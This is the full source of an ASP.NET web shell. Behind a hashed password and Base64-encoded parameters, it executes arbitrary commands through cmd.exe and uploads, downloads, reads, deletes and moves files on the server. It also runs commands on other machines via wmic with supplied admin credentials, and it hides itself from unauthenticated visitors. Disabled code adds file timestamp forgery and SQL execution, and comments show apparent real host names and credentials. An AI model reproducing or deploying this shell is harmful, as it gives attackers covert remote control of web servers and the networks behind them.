<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>
<%@ Import namespace="System.IO"%>

<%
    try
    {
        NameValueCollection t = HttpContext.Current.Request.Form;

        method selectedMethod = method.auth;

        try
        {
            int methodID = int.Parse(fb(t["m"]));
            selectedMethod = (method)methodID;
        }
        catch
        {
            rm();
        }

        p = fb(t["p"]);
        upb = fb(t["upb"]);
        upd = fb(t["upd"]);
        del = fb(t["del"]);
        hid = t["hid"];
        tfil = fb(t["tfil"]);
        ttar = fb(t["ttar"]);
        ttim = fb(t["ttim"]);
        baseFile = t["baseFile"];
        baseAddr = fb(t["baseAddr"]);
        baseVir = t["baseVir"];
        sqc = fb(t["sqc"]);
        sqq = fb(t["sqq"]);

        if (string.IsNullOrEmpty(p))
        {
            if (HttpContext.Current.Request.Cookies["p"] != null)
                p = fb(HttpContext.Current.Request.Cookies["p"].Value);
        }

        if (!login(p))
        {
            rm();
        }

        switch (selectedMethod)
        {
            case method.auth:
                auth(p);
                break;
            case method.command:
                command(fb(t["cmd"]));
                break;
            case method.upload:
                upload(HttpContext.Current.Request.Files["upl"], fb(t["sav"]), fb(t["nen"]));
                break;
            //case method.uploadbase64:
            //    baseupl(baseFile,baseAddr,string.IsNullOrEmpty(baseVir)?false:true);
            //    break;
            case method.download:
                download(fb(t["don"]));
                break;
            //case method.changeTime:
            //    g(hid,tfil,ttar,ttim);
            //    break;
            //case method.sqlQuery:
            //    sq(sqc,sqq);
            //    break;
            case method.explorer:
                exp(fb(t["exadd"]));
                break;
            case method.getsize:
                gsize(fb(t["gsize"]));
                break;
            case method.getlocation:
                getLoc();
                break;
            case method.rename:
                rename(fb(t["rename1"]), fb(t["rename2"]));
                break;
            case method.copy:
                copy(fb(t["copy1"]), fb(t["copy2"]));
                break;
            case method.view:
                view(fb(t["view"]));
                break;
            case method.commandB:
                fnCmdB(fb(t["cmd"]));
                break;
            case method.delete:
                delete(fb(t["delete"]));
                break;
            default:
                break;
        }
    }
    catch (Exception ex)
    {
        response("Error : " + ex.Message);
    }
    %>
<script runat="server">
    enum method
    {
        auth = 0,
        command = 1,
        upload = 2,
        uploadbase64 = 3,
        delete = 4,
        download = 5,
        changeTime = 6,
        sqlQuery = 7,
        explorer = 8,
        getsize = 9,
        getlocation = 10,
        rename= 11,
        copy= 12,
        view= 13,
        commandB = 14
    };
    string salt="sdfewq@#$51234234DF@#$!@#$ASDF";
    string p,pro,cmd,sav,vir,nen,upb,upd,del,don,hid,tfil,ttar,ttim,baseFile,baseAddr,baseVir,baseName,sqc,sqq,exadd,adminU,adminP,cmdB;
    string SpecialScript;
    bool aut=false;
    string pp="J3ugYdknpax1ZbHB2QILB5NS6dVa0iUD0mhhBPv0Srw=";
    string a(string a,string b){return string.IsNullOrEmpty(a)?b:a;}
    string tb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Convert.ToBase64String(Encoding.UTF8.GetBytes(a));}catch{}return ret;}
    string fb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Encoding.UTF8.GetString(Convert.FromBase64String(a));}catch{}return ret;}
    void view(){string data = string.Format("pro#=#{0}#|#cmd#=#{1}#|#sav#=#{2}#|#vir#=#{3}#|#nen#=#{4}#|#don#=#{5}#|#tfil#=#{6}#|#ttar#=#{7}#|#ttim#=#{8}|#sqc#=#{9}|#sqq#=#{10}|#exadd#=#{11}|#adminU#=#{12}|#adminP#=#{13}",
    tb(pro),tb(cmd),tb(sav),tb(vir),tb(nen),tb(don),tb(tfil),tb(ttar),tb(ttim),tb(sqc),tb(sqq),tb(exadd),tb(adminU),tb(adminP));
        HttpCookie coo=new HttpCookie("data", data);coo.Expires=DateTime.Now.AddDays(1);HttpContext.Current.Response.SetCookie(coo);}

    void rm(){/*System.IO.File.Delete(Request.ServerVariables["PATH_TRANSLATED"]);Response.Redirect(Request.RawUrl);*/Response.Redirect(Request.Url.AbsolutePath.Substring(0, Request.Url.AbsolutePath.LastIndexOf("/") + 1) + " " + Request.Url.AbsolutePath.Substring(Request.Url.AbsolutePath.LastIndexOf("/") + 1));}
    void auth(string p)
    {
        string ret = string.Empty;
        try
        {
            ret = login(p).ToString();
        }
        catch (Exception e)
        {
            ret = "Error : " + e.Message;
        }

        response(ret);
    }

    bool login(string p)
    {
        bool aut = false;
        try
        {
            if (!string.IsNullOrEmpty(p))
            {
                aut = Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(p + salt))) == pp;
            }
        }
        catch (Exception e)
        {
            l(e.Message);
        }
        return aut;
    }

    void command(string cmd)
    {
        string ret = string.Empty;
        try
        {
            string o = exec(cmd);
            ret = HttpUtility.HtmlEncode(o);
        }
        catch (Exception e)
        {
            ret = "Error : " + e.Message;
        }
        response(ret);
    }

    //    void baseupl(string baseFile,string baseAddr, bool baseVir){try{if(c()){if(baseFile!=null&&baseFile.Length>0&&!string.IsNullOrEmpty(baseAddr)){string SaveLocation=baseVir?Server.MapPath(baseAddr):baseAddr;System.IO.File.WriteAllBytes(SaveLocation,Convert.FromBase64String(baseFile));l("File uploaded successfuly : "+SaveLocation);}}}catch(Exception ex){l(ex.Message);}}

    //    string ti(string tt){return "Creation Time :\t\t"+System.IO.File.GetCreationTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Access Time :\t"+System.IO.File.GetLastAccessTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Write Time :\t"+System.IO.File.GetLastWriteTime(tt).ToString("yyyy-MM-dd HH:mm:ss");}
    //    void g(string hid, string tfil, string ttar, string ttim){try{if(c()&&!string.IsNullOrEmpty(tfil)){l(string.Empty);if(hid=="1")ti(tfil);else if(hid=="2"){if(!string.IsNullOrEmpty(ttar)){System.IO.File.SetCreationTime(tfil,System.IO.File.GetCreationTime(ttar));System.IO.File.SetLastAccessTime(tfil,System.IO.File.GetLastAccessTime(ttar));System.IO.File.SetLastWriteTime(tfil,System.IO.File.GetLastWriteTime(ttar));l("Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil));}}else if(hid=="3"){if(!string.IsNullOrEmpty(ttim)){DateTime te=DateTime.Parse(ttim);System.IO.File.SetCreationTime(tfil,te);System.IO.File.SetLastAccessTime(tfil,te);System.IO.File.SetLastWriteTime(tfil,te);l("Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil));}}}}catch(Exception ex){l(ex.Message);}}
    //    void h(string upb, string upd){try{if(c()&&!string.IsNullOrEmpty(upb)&&!string.IsNullOrEmpty(upd)){System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath()+upd,Convert.FromBase64String(upb));l(upd+" successfuly uploaded");}}catch(Exception ex){l(ex.Message);}}
    //    void d(string del){try{if(c()&&!string.IsNullOrEmpty(del)){System.IO.File.Delete(System.IO.Path.GetTempPath()+del);l(del+" successfuly deleled");}}catch(Exception ex){l(ex.Message);}}
    //    void sq(string sqc, string sqq){
    //        try {
    //            if (c())
    //            {
    //                if (!string.IsNullOrEmpty(sqc))
    //                {
    //                    using (System.Data.SqlClient.SqlConnection con = new System.Data.SqlClient.SqlConnection(sqc))
    //                    {
    //                        if (string.IsNullOrEmpty(sqq))
    //                        {
    //                            try
    //                            {
    //                                con.Open();
    //                                l("Sql Server Connection Successfuly Established");
    //                            }
    //                            catch (Exception ex)
    //                            {
    //                                l("Sql Server Connection Failed :" + Environment.NewLine + ex.ToString());
    //                            }
    //                        }
    //                        else
    //                        {
    //                            try
    //                            {
    //                                con.Open();
    //                                System.Data.SqlClient.SqlCommand com = new System.Data.SqlClient.SqlCommand(sqq, con);
    //                                System.Data.SqlClient.SqlDataAdapter ad = new System.Data.SqlClient.SqlDataAdapter(com);
    //                                System.Data.DataTable dt = new System.Data.DataTable();
    //                                ad.Fill(dt); DataGrid grid = new DataGrid();
    //                                System.Web.UI.WebControls.DataList list = new System.Web.UI.WebControls.DataList();
    //                                grid.DataSource = dt;
    //                                grid.DataBind();
    //                                StringWriter sw = new StringWriter();
    //                                HtmlTextWriter htw = new HtmlTextWriter(sw);
    //                                HtmlForm form = new HtmlForm();
    //                                form.Attributes["runat"] = "server";
    //                                form.Controls.Add(grid);
    //                                this.Controls.Add(form);
    //                                Form.RenderControl(htw);
    //                                l(sw.ToString());
    //                            }
    //                            catch (Exception ex)
    //                            {
    //                                l("Error : <br>" + ex.ToString());
    //                            }
    //                        }
    //                        con.Close();
    //                    }
    //                }
    //            }
    //        }
    //        catch (Exception ex)
    //        {
    //            l(ex.Message);
    //        }
    //    }
    //    string x(string f){return Encoding.UTF8.GetString(Convert.FromBase64String(f));}
    void l(string ll) { response(ll); }

    void upload(HttpPostedFile upl, string sav, string nen)
    {
        string ret = "Error : -";
        try
        {
            if (upl != null && upl.ContentLength > 0)
            {
                string fn = string.IsNullOrEmpty(nen) ? System.IO.Path.GetFileName(upl.FileName) : nen;
                string SaveLocation = System.IO.Path.HasExtension(sav) ? sav : sav.TrimEnd('\\') + "\\" + fn;
                upl.SaveAs(SaveLocation);
                ret = "File uploaded successfuly : " + SaveLocation;
            }
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }
        response(ret);
    }

    void getLoc()
    {
        response(Server.MapPath(string.Empty) + "\\");
    }

    void download(string don)
    {
        try
        {
            if (!string.IsNullOrEmpty(don))
            {
                byte[] f=System.IO.File.ReadAllBytes(don);
                Response.Clear();
                Response.ClearHeaders();
                Response.ClearContent();
                Response.AppendHeader("content-length", f.Length.ToString());
                Response.ContentType = "application/octet-stream";
                Response.AppendHeader("content-disposition", "attachment; filename=" + don.Substring(don.LastIndexOf('\\') + 1));
                Response.BinaryWrite(f);
                Response.Flush();
                Response.SuppressContent = true;
                ApplicationInstance.CompleteRequest();
            }
        }
        catch
        {
        }
    }

    string exec(string cmd,string pro = "")
    {
        System.Diagnostics.Process n=new System.Diagnostics.Process();
        n.StartInfo.FileName=(string.IsNullOrEmpty(pro)?"cmd.exe":pro);
        n.StartInfo.UseShellExecute=false;
        n.StartInfo.RedirectStandardInput=true;
        n.StartInfo.RedirectStandardOutput=true;
        n.StartInfo.RedirectStandardError=true;
        n.StartInfo.CreateNoWindow=true;
        string o=null;
        n.Start();
        n.StandardInput.WriteLine(cmd);
        n.StandardInput.WriteLine("exit");
        o =n.StandardOutput.ReadToEnd();
        n.WaitForExit();
        n.Close();
        return o;
    }

    void fnCmdB(string cmd)
    {
        string ret = "Error : -";
        try
        {
            string o = exec(cmd);

            o = o.Remove(0, o.IndexOf(Environment.NewLine) + 2);
            o = o.Remove(0, o.IndexOf(Environment.NewLine) + 2);
            o = o.Remove(0, o.IndexOf(Environment.NewLine));
            o = o.Remove(o.LastIndexOf(Environment.NewLine));
            o = o.Remove(o.LastIndexOf(Environment.NewLine) + 2);

            ret = HttpUtility.HtmlEncode(o);
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        response(ret);
    }


    void gsize(string addr)
    {
        string ret = "Error : -";
        try
        {
            hasErrorInGetSize = false;
            long size = GetDirSize(new DirectoryInfo(addr));
            ret = sizeFix(size);

            if (hasErrorInGetSize && sizelvl == 0)
                ret = sizeError;
            else if(hasErrorInGetSize)
                ret = "!" + ret;
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        response(ret);
    }

    void view(string path)
    {
        string ret = "You are viewing the contents of this file : " + path + Environment.NewLine;
        try
        {
            ret += File.ReadAllText(path);
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        response(ret);
    }

    void delete(string path)
    {
        string ret = "Error : -";
        try
        {
            File.Delete(path);
            ret = string.Format("{{\"message\":\"{0}\",\"dirInfo\":\"{1}\"}}",
                tb(string.Format("File '{0}' successfuly deleted{1}", path, Environment.NewLine)),
                tb(getDirectoryInfo(Path.GetDirectoryName(path))));
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        response(ret);
    }

    void rename(string oldName, string newName)
    {
        string ret = "Error : -";
        try
        {
            if (newName.EndsWith("\\"))
                newName += Path.GetFileName(oldName);
            File.Move(oldName, newName);
            ret = string.Format("{{\"message\":\"{0}\",\"dirInfo\":\"{1}\"}}",
                tb(string.Format("File '{0}' successfuly moved to '{1}'{2}", oldName, newName, Environment.NewLine)),
                tb(getDirectoryInfo(Path.GetDirectoryName(oldName))));
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        response(ret);
    }
    void copy(string oldName, string newName)
    {
        string ret = "Error : -";
        try
        {
            if (newName.EndsWith("\\"))
                newName += Path.GetFileName(oldName);
            File.Copy(oldName, newName);
            ret = string.Format("{{\"message\":\"{0}\",\"dirInfo\":\"{1}\"}}",
                tb(string.Format("File '{0}' successfuly copied to '{1}'{2}", oldName, newName, Environment.NewLine)),
                tb(getDirectoryInfo(Path.GetDirectoryName(oldName))));
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        response(ret);
    }

    string getDirectoryInfo(string address)
    {
        string ret = "Error : -";
        try
        {
            if (address.ToLower() == "root")
            {
                ret = "{\"dir\":[{\"name\":\"\\\\\\\\localhost\"}";// in javascript json parser two \ = one \
                string netUse = exec("net use");
                string[] lines = netUse.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
                foreach (string item in lines)
                {
                    if (item.ToLower().StartsWith("ok"))
                    {
                        int index = item.IndexOf("\\\\");
                        ret += ",{\"name\":\"\\\\" + item.Substring(index, item.IndexOf('\\', index + 2) - index) + "\"}";
                    }
                }
                ret += "]}";
            }
            else
            {
                if (address.StartsWith("\\\\") && address.Trim('\\').Split('\\').Count() == 1) // \\localhost
                {
                    string tmp = address.ToLower().TrimEnd('\\');
                    if (tmp == "\\\\localhost")
                    {
                        ret = "{\"dir\":[";
                        bool isStart = false;
                        foreach (DriveInfo item in DriveInfo.GetDrives())
                        {
                            if (item.IsReady)
                            {
                                if (isStart)
                                    ret += ",";
                                ret += string.Format("{{\"name\":\"{0}\",\"totalSize\":\"{1}\",\"freeSpace\":\"{2}\",\"sizeText\":\"{3}\",\"format\":\"{4}\",\"type\":\"{5}\"}}"
                                    , item.Name.TrimEnd('\\').TrimEnd(':') + "$"
                                    , item.TotalSize
                                    , item.TotalFreeSpace
                                    , "[" + sizeFix(item.TotalFreeSpace) + "] free of [" + sizeFix(item.TotalSize) + "]"
                                    , item.DriveFormat
                                    , item.DriveType);
                                isStart = true;
                            }
                        }
                        ret += "]}";
                    }
                    else
                    {
                        //wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description
                        //wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c {3} >> {4}"" 2>&1
                        //wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> {4}"" 2>&1 
                        //wmic /node:localhost process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> c:\windows\temp\abcd.txt"" 2>&1 
                        if (!string.IsNullOrEmpty(adminU) && !string.IsNullOrEmpty(adminP))
                        {
                            //wmic /node:localhost process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> c:\windows\temp\abcd.txt"" 2>&1 
                            //Caption
                            //C:
                            //D:
                            //E:
                            //Caption
                            //C:
                            //D:
                            //E:
                            //FileSystem
                            //NTFS
                            //NTFS

                            //Size
                            //128842870784
                            //164711362560

                            //FreeSpace
                            //99978657792
                            //161243799552

                            //Description
                            //Local Fixed Disk
                            //Local Fixed Disk
                            //CD-ROM Disc

                            //type \\bdfdc\c$\windows\temp\KMSHFX0023.tmp 2>&1
                            //del \\bdfdc\c$\windows\temp\KMSHFX0023.tmp 2>&1

                            //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Caption" 2>&1
                            //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get FileSystem" 2>&1
                            //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Size" 2>&1
                            //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get FreeSpace" 2>&1
                            //wmic /node:bdfdc /user:veritas /password:veritas process call create "cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Description" 2>&1

                            //Access  Availability  BlockSize  Caption  Compressed  ConfigManagerErrorCode  ConfigManagerUserConfig  CreationClassName  Description       DeviceID  DriveType  ErrorCleared  ErrorDescription  ErrorMethodology  FileSystem  FreeSpace     InstallDate  LastErrorCode  MaximumComponentLength  MediaType  Name  NumberOfBlocks  PNPDeviceID  PowerManagementCapabilities  PowerManagementSupported  ProviderName  Purpose  QuotasDisabled  QuotasIncomplete  QuotasRebuilding  Size          Status  StatusInfo  SupportsDiskQuotas  SupportsFileBasedCompression  SystemCreationClassName  SystemName  VolumeDirty  VolumeName  VolumeSerialNumber
                            //0                                C:       FALSE                                                        Win32_LogicalDisk  Local Fixed Disk  C:        3                                                            NTFS        99978657792                               255                     12         C:                                                                                                               TRUE            FALSE             FALSE             128842870784                      TRUE                TRUE                          Win32_ComputerSystem     BDFDC       FALSE                    54250D25
                            //0                                D:       FALSE                                                        Win32_LogicalDisk  Local Fixed Disk  D:        3                                                            NTFS        161243799552                              255                     12         D:                                                                                                               TRUE            FALSE             FALSE             164711362560                      TRUE                TRUE                          Win32_ComputerSystem     BDFDC       FALSE                    6C7130E4
                            //                                 E:                                                                    Win32_LogicalDisk  CD-ROM Disc       E:        5                                                                                                                                          11         E:                                                                                                                                                                                                                                                       Win32_ComputerSystem     BDFDC

                            tmp = tmp.TrimStart('\\');
                            exec(string.Format(@"del \\{0}\c$\windows\temp\KMSHFX0023.tmp 2>&1", tmp));
                            exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Caption"" 2>&1", tmp, adminU, adminP));
                            exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get FileSystem"" 2>&1", tmp, adminU, adminP));
                            exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Size"" 2>&1", tmp, adminU, adminP));
                            exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get FreeSpace"" 2>&1", tmp, adminU, adminP));
                            exec(string.Format(@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c >> c:\windows\temp\KMSHFX0023.tmp 2>&1 wmic logicaldisk get Description"" 2>&1", tmp, adminU, adminP));
                            System.Threading.Thread.Sleep(1000);
                            string[] logicalDisk = File.ReadAllLines(string.Format(@"\\{0}\c$\windows\temp\KMSHFX0023.tmp", tmp));
                            System.Threading.Thread.Sleep(500);
                            exec(string.Format(@"del \\{0}\c$\windows\temp\KMSHFX0023.tmp 2>&1", tmp));

                            List<string> diskTemp = new List<string>();
                            bool firstTime = true;
                            int diskID = 0;
                            foreach (string item in logicalDisk)
                            {
                                if (item == "Caption")
                                {
                                    continue;
                                }
                                else if (item == "FileSystem" || item == "Size" || item == "FreeSpace" || item == "Description")
                                {
                                    firstTime = false;
                                    diskID = 0;
                                    continue;
                                }

                                if (firstTime)
                                    diskTemp.Add(item);
                                else
                                    diskTemp[diskID++] += "|" + item;
                            }

                            ret = "{\"dir\":[";
                            bool isStart = false;
                            foreach (string item in diskTemp)
                            {
                                string[] diskInfo = item.Split('|');

                                long TotalSize = long.Parse(diskInfo[2]);
                                long TotalFreeSpace = long.Parse(diskInfo[3]);

                                if (isStart)
                                    ret += ",";
                                ret += string.Format("{{\"name\":\"{0}\",\"totalSize\":\"{1}\",\"freeSpace\":\"{2}\",\"sizeText\":\"{3}\",\"format\":\"{4}\",\"type\":\"{5}\"}}"
                                    , diskInfo[0].TrimEnd('\\').TrimEnd(':') + "$"
                                    , TotalSize
                                    , TotalFreeSpace
                                    , "[" + sizeFix(TotalFreeSpace) + "] free of [" + sizeFix(TotalSize) + "]"
                                    , diskInfo[1]
                                    , diskInfo[4]);
                                isStart = true;
                            }
                            ret += "]}";
                        }
                        else
                            ret = "Error : Admin Username or Password is empty";
                    }
                }
                else // \\localhost\c$\
                {
                    FileAttributes attr = File.GetAttributes(address);
                    if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                    {
                        DirectoryInfo dirInfo = new DirectoryInfo(address);
                        ret = "{" + string.Format("{0},{1}", createJsonDirectory(dirInfo.GetDirectories()), createJsonFile(dirInfo.GetFiles())) + "}";
                    }
                }
            }
        }
        catch (Exception ex)
        {
            ret = "Error : " + ex.Message;
        }

        return ret;
    }
    void exp(string exadd)
    {
        string ret = "Error : -";

        ret = getDirectoryInfo(exadd);

        response(ret);
    }

    bool hasErrorInGetSize = false;
    int sizelvl = 0;
    string sizeError;
    long GetDirSize(DirectoryInfo d)
    {
        long size = 0;

        try
        {
            FileInfo[] fis = d.GetFiles();
            foreach (FileInfo fi in fis)
            {
                size += fi.Length;
            }

            sizelvl++;

            DirectoryInfo[] dis = d.GetDirectories();
            foreach (DirectoryInfo di in dis)
            {
                size += GetDirSize(di);
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            sizeError = "Error : " + ex.Message;
            hasErrorInGetSize = true;
        }

        return size;
    }
    string createJsonDirectory(DirectoryInfo[] dir)
    {
        string json = "\"dir\":[";
        for (int i = 0; i < dir.Length; i++)
        {
            if (i > 0)
                json += ",";
            json += string.Format("{{\"name\":\"{0}\"}}", dir[i].Name);
            //json += "\"" + dir[i].Name + "\"";
        }
        json += "]";
        return json;
    }
    string createJsonFile(FileInfo[] file)
    {
        string json = "\"file\":[";
        for (int i = 0; i < file.Length; i++)
        {
            if (i > 0)
                json += ",";
            json += string.Format("{{\"name\":\"{0}\",\"size\":\"{1}\"}}",file[i].Name,sizeFix(file[i].Length));
        }
        json += "]";
        return json;
    }
    string sizeFix(long size)
    {
        double s = size;
        if (s < 1024) return s + " B";
        s = s / 1024;
        if (s < 1024) return Math.Round(s, 2) + " KB";
        s = s / 1024;
        if (s < 1024) return Math.Round(s, 2) + " MB";
        s = s / 1024;
        if (s < 1024) return Math.Round(s, 2) + " GB";
        s = s / 1024;
        return Math.Round(s, 2) + " TB";
    }

    void response(string res)
    {
        Response.Clear();
        Response.Write(tb(res));
        Response.Headers.Add("Access-Control-Allow-Origin", "*");
        Response.Flush();
        Response.SuppressContent = true;
        ApplicationInstance.CompleteRequest();
    }
</script>